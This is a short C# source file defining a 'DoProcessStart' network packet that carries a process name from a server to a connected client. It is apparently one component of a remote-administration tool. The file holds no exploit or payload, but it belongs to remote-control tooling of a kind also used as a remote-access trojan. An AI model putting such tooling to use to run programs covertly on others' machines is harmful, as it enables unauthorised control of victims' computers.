using System;
using xServer.Core.Networking;

namespace xServer.Core.Packets.ServerPackets
{
    [Serializable]
    public class DoProcessStart : IPacket
    {
        public string Processname { get; set; }

        public DoProcessStart()
        {
        }

        public DoProcessStart(string processname)
        {
            this.Processname = processname;
        }

        public void Execute(Client client)
        {
            client.Send(this);
        }
    }
}